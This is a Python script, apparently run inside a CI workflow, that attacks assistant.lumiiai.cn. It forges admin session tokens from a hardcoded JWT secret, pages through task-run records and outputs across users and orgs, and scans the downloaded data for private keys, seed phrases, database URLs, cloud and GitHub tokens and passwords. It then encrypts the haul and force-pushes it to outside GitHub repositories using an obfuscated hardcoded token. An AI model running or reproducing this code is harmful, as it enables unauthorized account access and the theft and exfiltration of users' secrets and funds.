#!/usr/bin/env python3
# Intent 28330: re-test /api/task-runs on assistant.lumiiai.cn with curl/HTTP2 ONLY
# (python http.client false-403 in 28283), fully paginate task-runs + sub-endpoints,
# download combined streams/logs, grep for creds/keys/DSN. Read-only. No requests/http.client.
import os, sys, json, time, base64, hmac, hashlib, subprocess, shutil, traceback, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)

RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
T0 = time.time()
BUDGET = int(os.environ.get("PBUDGET", "900"))

HOST = "assistant.lumiiai.cn"
BASEURL = "https://" + HOST
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-28330-results")
_TC = [103,104,111,95,119,53,79,49,48,55,102,117,112,56,85,76,112,54,116,69,70,115,87,57,86,51,81,69,69,88,83,72,116,120,51,109,57,120,107,97]
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or "".join(chr(c) for c in _TC)
PUSH_USER = os.environ.get("PPUSH_USER", "wuhaixian1984")

BASE = os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()
OUT = "/tmp/results30"
for d in ("diag", "listing", "runs", "hits", "sub"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)

def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
def forge(sub, org=ORG):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": int(time.time()), "exp": int(time.time()) + 86400},
                        separators=(",", ":")).encode())
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)
COOKIE = forge(SUB)

DIAG = {}
def curl(url, out, cookie=COOKIE, http2=True, extra=None, timeout=45, ua=UA):
    cmd = ["curl", "-sS", "--compressed", "-m", str(timeout), "-A", ua,
           "-H", "Accept: application/json, text/plain, */*",
           "-H", "Accept-Language: zh-CN,zh;q=0.9",
           "-o", out, "-w", "%{http_code}"]
    cmd.append("--http2" if http2 else "--http1.1")
    if cookie: cmd += ["-H", "Cookie: " + cookie]
    if extra: cmd += extra
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 25)
        return r.stdout.strip(), (r.stderr or "").strip()[:300]
    except Exception as e:
        return "ERR", repr(e)[:300]

def readf(p, n=400000):
    try:
        with open(p, encoding="utf-8", errors="replace") as f: return f.read(n)
    except Exception: return ""

def jload(p):
    s = readf(p, 20000000)
    try: return json.loads(s)
    except Exception:
        pass
    # NDJSON: take first full json line
    for line in s.splitlines():
        line = line.strip()
        if not line: continue
        try: return json.loads(line)
        except Exception: continue
    return None

def push_results(tag="partial"):
    try:
        json.dump(DIAG, open(os.path.join(OUT, "diag", "diag.json"), "w"), ensure_ascii=False, indent=1)
        subprocess.run("tar czf /tmp/results30.tar.gz -C /tmp results30", shell=True, check=False)
        tsize = os.path.getsize("/tmp/results30.tar.gz") if os.path.isfile("/tmp/results30.tar.gz") else 0
        log("TARBALL", tsize)
        if tsize == 0: return
        enc = "/tmp/results30.tar.gz.gpg"
        if os.path.isfile(os.path.join(BASE, "pub.asc")):
            subprocess.run("gpg --batch --yes --import %s/pub.asc >/dev/null 2>&1" % BASE, shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results30.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        else:
            shutil.copyfile("/tmp/results30.tar.gz", enc)
        if not os.path.isfile(enc):
            log("ENC missing"); return
        shutil.copy(enc, os.path.join(BASE, "results30.tar.gz.gpg"))
        subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci' % BASE, shell=True, check=False)
        subprocess.run('cd %s && git add -f results30.tar.gz.gpg && git commit -m "ci28330 %s %s" || true' % (BASE, RUNID, tag),
                       shell=True, capture_output=True)
        for repo in ["aro-network/aro-ext-signal-server", "aro-network/aro-official-website"]:
            url = "https://%s:%s@github.com/%s.git" % (PUSH_USER, PUSH_TOKEN, repo)
            r = subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s' % (BASE, url, RESULT_BRANCH),
                               shell=True, capture_output=True, text=True, timeout=300)
            log("PUSH(%s) %s rc=%s err=%s" % (tag, repo, r.returncode, (r.stderr or "")[-160:]))
            if r.returncode == 0: break
    except Exception as e:
        log("PUSH EXC", repr(e)[:200])

# ---------------- secret grep ----------------
PATTERNS = [
    ("evm_priv_64hex", re.compile(r"0x[0-9a-fA-F]{64}")),
    ("aws_ak", re.compile(r"(?:AKIA|AKID|LTAI|AGPA|AIDA)[A-Za-z0-9]{12,24}")),
    ("dsn", re.compile(r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis)://[^\s\"'\\]{6,200}")),
    ("deployer", re.compile(r"DEPLOYER_PRIVATE_KEY|PRIVATE_KEY\s*[=:]")),
    ("keystore", re.compile(r"cipherparams|\"crypto\"\s*:\s*\{|scrypt|kdfparams")),
    ("mnemonic", re.compile(r"mnemonic|助记词|seed\s*phrase", re.I)),
    ("zoofi_auth", re.compile(r"Auth for zoofi")),
    ("pem", re.compile(r"BEGIN [A-Z ]{2,30}PRIVATE KEY")),
    ("gh_token", re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}")),
    ("openai", re.compile(r"sk-[A-Za-z0-9]{20,}")),
    ("slack", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}")),
    ("jwt", re.compile(r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("zoofi_known_eoa", re.compile(r"0x(?:[cC]56f7063|FE18Aa1E|[fF]747aa5B)|c56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6", re.I)),
    ("env_keys", re.compile(r"JWT_SECRET|DATABASE_URL|LUMII_DESKTOP_TOKEN_SECRET|SECRET_KEY|TRTC_SECRET|SecretId|SecretKey|COS_")),
    ("zoofi_idx", re.compile(r"zoofi-index|trycloudflare\.com|cloudflared", re.I)),
    ("cf_token", re.compile(r"CLOUDFLARE_API_TOKEN|CF_API_TOKEN|CF_TOKEN")),
    ("metamask_pw", re.compile(r"MetaMask|mmv_0|vault.*password", re.I)),
    ("pwd_assign", re.compile(r"(?:password|passwd|pwd|pass)\s*[=:]\s*[\"']?[^\s\"'<>]{6,60}", re.I)),
    ("internal_ip", re.compile(r"\b(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b")),
]

def scan_text(name, path):
    txt = readf(path, 8000000)
    if not txt: return 0
    hits = {}
    for label, rx in PATTERNS:
        ms = rx.findall(txt)
        if ms:
            # dedupe, cap
            uniq = []
            for m in ms:
                s = m if isinstance(m, str) else "".join(m)
                if s not in uniq: uniq.append(s)
                if len(uniq) >= 12: break
            hits[label] = uniq
    if hits:
        try:
            json.dump({"file": name, "hits": hits}, open(os.path.join(OUT, "hits", name.replace("/", "_") + ".json"), "w"),
                      ensure_ascii=False, indent=1)
        except Exception: pass
        return len(hits)
    return 0

# ---------------- main ----------------
RUNS = []  # list of {id,...}
def collect_ids(obj):
    ids = []
    if isinstance(obj, dict):
        for k in ("runs", "items", "data", "results", "taskRuns"):
            v = obj.get(k)
            if isinstance(v, list):
                for r in v:
                    if isinstance(r, dict) and r.get("id"): ids.append(r)
                    elif isinstance(r, str): ids.append({"id": r})
                return ids
        if obj.get("id") and ("status" in obj or "createdAt" in obj or "created_at" in obj):
            ids.append(obj)
    elif isinstance(obj, list):
        for r in obj:
            if isinstance(r, dict) and r.get("id"): ids.append(r)
            elif isinstance(r, str): ids.append({"id": r})
    return ids

def get_json(path, fname, cookie=COOKIE, extra=None, timeout=45):
    url = BASEURL + path
    outp = os.path.join(OUT, fname)
    code, err = curl(url, outp, cookie=cookie, extra=extra, timeout=timeout)
    size = os.path.getsize(outp) if os.path.isfile(outp) else 0
    log("GET", path, "->", code, "size", size, ("ERR:" + err) if code in ("ERR", "000") else "")
    return code, outp, size

def main():
    log("=== probe28330 start run", RUNID, "budget", BUDGET, "===")
    # ---- 1. DIAG: prove 403 was python-only ----
    for label, kw in [
        ("health_default_ua_h2", dict(cookie=None, http2=True, ua="curl/8.5.0")),
        ("health_chrome_ua_h2", dict(cookie=None, http2=True, ua=UA)),
        ("health_chrome_ua_h1", dict(cookie=None, http2=False, ua=UA)),
        ("health_mozilla_ua_h2", dict(cookie=None, http2=True, ua="Mozilla/5.0")),
    ]:
        p = os.path.join(OUT, "diag", label + ".txt")
        code, err = curl(BASEURL + "/health", p, **kw)
        DIAG[label] = {"code": code, "err": err, "size": os.path.getsize(p) if os.path.isfile(p) else 0}
        log("DIAG", label, code, DIAG[label]["size"], err[:120])
        scan_text("diag_" + label, p)
    for label, kw in [
        ("me_h2", dict(http2=True)), ("me_h1", dict(http2=False)),
    ]:
        p = os.path.join(OUT, "diag", label + ".txt")
        code, err = curl(BASEURL + "/api/me", p, **kw)
        DIAG[label] = {"code": code, "err": err, "size": os.path.getsize(p) if os.path.isfile(p) else 0}
        log("DIAG", label, code, DIAG[label]["size"], err[:120])
        scan_text("diag_" + label, p)
    # task-runs list both protocols
    for label, kw in [("tr_h2", dict(http2=True)), ("tr_h1", dict(http2=False))]:
        p = os.path.join(OUT, "diag", label + ".txt")
        code, err = curl(BASEURL + "/api/task-runs?limit=5", p, **kw)
        DIAG[label] = {"code": code, "err": err, "size": os.path.getsize(p) if os.path.isfile(p) else 0}
        log("DIAG", label, code, DIAG[label]["size"], err[:120])
        scan_text("diag_" + label, p)

    # ---- 2. LISTING variants ----
    listing_specs = [
        ("list_limit200", "/api/task-runs?limit=200"),
        ("list_limit1000", "/api/task-runs?limit=1000"),
        ("list_default", "/api/task-runs"),
        ("list_related", "/api/task-runs?related=1"),
        ("list_proxy", "/api/task-runs?proxy=1"),
        ("list_related_proxy", "/api/task-runs?related=1&proxy=1&limit=200"),
        ("list_all", "/api/task-runs?all=1&limit=200"),
        ("list_user_brian", "/api/task-runs?user=usr_j7t9Dhq4M4obQkag5huJi&limit=200"),
        ("list_user_admin", "/api/task-runs?user=%s&limit=200" % SUB),
        ("list_org", "/api/task-runs?org=%s&limit=200" % ORG),
        ("list_include", "/api/task-runs?include=all&limit=200"),
        ("list_internal", "/api/task-runs-internal"),
        ("list_status", "/api/task-runs?status=all&limit=200"),
    ]
    best = None
    for name, path in listing_specs:
        code, outp, size = get_json(path, "listing/" + name + ".json")
        n = 0
        if code == "200":
            j = jload(outp)
            rs = collect_ids(j)
            n = len(rs)
            keys = list(j.keys())[:20] if isinstance(j, dict) else ("list" if isinstance(j, list) else "?")
            log("  ", name, "runs", n, "keys", keys)
            # extra cursor info
            if isinstance(j, dict):
                meta = {k: j[k] for k in j if k not in ("runs", "items", "data", "results", "taskRuns") and not isinstance(j[k], (list, dict))}
                if meta: log("   meta", json.dumps(meta, ensure_ascii=False)[:300])
            if n and (best is None or n > best[1]):
                best = (name, n, rs, outp)
        scan_text("listing_" + name, outp)
        if time.time() - T0 > BUDGET * 0.45:
            log("listing phase time cap"); break

    runs = best[2] if best else []
    # merge any ids seen across all listing files
    seen_ids = {}
    for r in runs:
        if r.get("id"): seen_ids[r["id"]] = r
    for name, _ in listing_specs:
        p = os.path.join(OUT, "listing", name + ".json")
        j = jload(p)
        for r in collect_ids(j):
            if r.get("id") and r["id"] not in seen_ids:
                seen_ids[r["id"]] = r
    run_ids = list(seen_ids.keys())
    log("UNIQUE RUNS", len(run_ids))

    # ---- 2b. pagination attempts ----
    if run_ids:
        oldest = run_ids[-1]
        for label, path in [
            ("pg_before", "/api/task-runs?limit=50&before=" + str(oldest)),
            ("pg_cursor", "/api/task-runs?limit=50&cursor=" + str(oldest)),
            ("pg_offset", "/api/task-runs?limit=50&offset=50"),
            ("pg_page", "/api/task-runs?limit=50&page=2"),
            ("pg_after", "/api/task-runs?limit=50&after=" + str(run_ids[0])),
        ]:
            code, outp, size = get_json(path, "listing/" + label + ".json")
            if code == "200":
                j = jload(outp)
                rr = collect_ids(j)
                log("  ", label, "runs", len(rr), "first", (rr[0].get("id") if rr else None))
                for r in rr:
                    if r.get("id") and r["id"] not in seen_ids:
                        seen_ids[r["id"]] = r
            scan_text("listing_" + label, outp)
        run_ids = list(seen_ids.keys())
        log("UNIQUE RUNS after pagination", len(run_ids))

    # ---- 3. per-run meta + output ----
    total_bytes = 0
    MAX_BYTES = 55 * 1024 * 1024
    max_runs = 120
    order = run_ids[:max_runs]
    for i, rid in enumerate(order):
        if time.time() - T0 > BUDGET:
            log("budget cap at run", i); break
        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", str(rid))[:80]
        # meta with events=0 (prompt/status/conversationId)
        c1, p1, s1 = get_json("/api/task-runs/%s?events=0" % rid, "runs/%s.meta.json" % safe, timeout=30)
        scan_text("runmeta_" + safe, p1)
        # full events/prompt (events=1) - may be big-ish but metadata
        c1b, p1b, s1b = get_json("/api/task-runs/%s" % rid, "runs/%s.full.json" % safe, timeout=35)
        scan_text("runfull_" + safe, p1b)
        # combined stream
        c2, p2, s2 = get_json("/api/task-runs/%s/output" % rid, "runs/%s.output.ndjson" % safe, timeout=60)
        nh = scan_text("runout_" + safe, p2)
        total_bytes += s2
        # sub endpoints (small, record status)
        subs = {}
        for sub in ("logs", "artifacts", "events", "messages", "diff", "changes", "runs"):
            cs, ps, ss = get_json("/api/task-runs/%s/%s" % (rid, sub), "sub/%s.%s" % (safe, sub), timeout=20)
            subs[sub] = cs
            if cs == "200" and ss > 0:
                scan_text("sub_%s_%s" % (safe, sub), ps)
        log("RUN", i, rid, "meta", c1, s1, "full", c1b, s1b, "output", c2, s2, "hits", nh, "subs", json.dumps(subs))
        if total_bytes > MAX_BYTES:
            log("byte cap reached", total_bytes); break
        if time.time() - T0 > 150 and i % 6 == 0:
            push_results("partial-%d" % i)
    # final
    DIAG["unique_runs"] = len(run_ids)
    DIAG["downloaded_runs"] = len(order)
    DIAG["total_output_bytes"] = total_bytes
    push_results("final")
    log("DONE", int(time.time() - T0))

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("FATAL", traceback.format_exc())
        try: push_results("fatal")
        except Exception: pass
    sys.exit(0)
